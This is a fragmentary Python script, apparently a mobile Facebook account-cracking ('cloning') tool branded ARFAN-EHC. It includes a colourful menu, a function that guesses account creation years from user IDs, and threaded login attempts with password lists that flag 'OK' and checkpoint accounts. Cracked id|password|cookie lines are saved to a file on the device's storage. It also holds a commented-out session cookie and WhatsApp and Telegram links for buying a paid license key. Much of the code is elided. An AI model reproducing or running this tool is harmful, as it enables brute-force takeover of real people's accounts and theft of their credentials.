...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[ARFAN-EHC')
...
def menu():
	...
	print('\033[38;5;46m══════════════════════════════════')
	_____ARFAN_____ = input('\033[1;92m[\033[1;34mEHC\033[1;92m]\033[0;92m𝑪𝑯𝑶𝑶𝑺𝑬✏️ :\x1b[1;92m ')
	if _____ARFAN_____ in ['1']:
		C1()
	if _____ARFAN_____ in ['2']:
		Y2()
	if _____ARFAN_____ in ['3']:
		BER()
	if _____ARFAN_____ in ['4']:
		os.system("xdg-open https://t.me/EHC99ARFAN ")
	if _____ARFAN_____ in ['0']:
		exit()			
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :ARFAN = '2009'
		elif fx[:9] in ['100000000']       :ARFAN = '2009'
		elif fx[:8] in ['10000000']        :ARFAN = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:ARFAN = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:ARFAN = '2010'
		elif fx[:6] in ['100001']          :ARFAN = '2010-2011'
		elif fx[:6] in ['100002','100003'] :ARFAN = '2011-2012'
		elif fx[:6] in ['100004']          :ARFAN = '2012-2013'
		elif fx[:6] in ['100005','100006'] :ARFAN = '2013-2014'
		elif fx[:6] in ['100007','100008'] :ARFAN = '2014-2015'
		elif fx[:6] in ['100009']          :ARFAN = '2015'
		elif fx[:5] in ['10001']           :ARFAN = '2015-2016'
		elif fx[:5] in ['10002']           :ARFAN = '2016-2017'
		elif fx[:5] in ['10003']           :ARFAN = '2018'
		elif fx[:5] in ['10004']           :ARFAN = '2019'
		elif fx[:5] in ['10005']           :ARFAN = '2020'
		elif fx[:5] in ['10006','10007','10008']:ARFAN = '2021-2022'
		else:ARFAN=''
	elif len(fx) in [9,10]:
		ARFAN = '2008-2009'
	elif len(fx)==8:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [ARFAN] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mARFAN-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r\x1b[1;92m [\033[1;92mARFAN-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/ARFAN-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break				
			else:
				continue
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as ARFAN:
        clear()
        tl = str(len(user))
        print('\033[38;5;46m══════════════════════════════════')
...
     'scheme':'https',
    ...
    # 'cookie': 'datr=g-peZb1aNk94GdRZFP3KhJSJ; sb=g-peZZN1M_ry5zs9RTs_nF2U; locale=en_US; wl_cbv=v2%3Bclient_version%3A2368%3Btimestamp%3A1700734641; vpd=v1%3B734x412x1.9240320920944214; m_pixel_ratio=1.9240320920944214; wd=375x668; fr=0byJucteEqS36riKU.AWWw05bEACscBPfdTBOXvD1Zj4s.BlXuqD.g3.AAA.0.0.BlX0j-.AWX7gryGbtI',
    'dpr': '1.75',
    ...
    'viewport-width': '980',
        ...
        sys.stdout.flush()
        sys.stdout.write('\r%s[ARFAN-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()	
    except:
     pass
def ARFAN(uid,pwv,tl):
    global loop
    global cps
    global oks
    global agents 
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801608002168?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20ARFAN%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://wa.me/+8801608002168/ARFAN/approved.txt/main/approved.%20txt').text
    if key1 in r:
        ...
        os.system('am start https://wa.me/+9710569549857?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20ARFAN%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
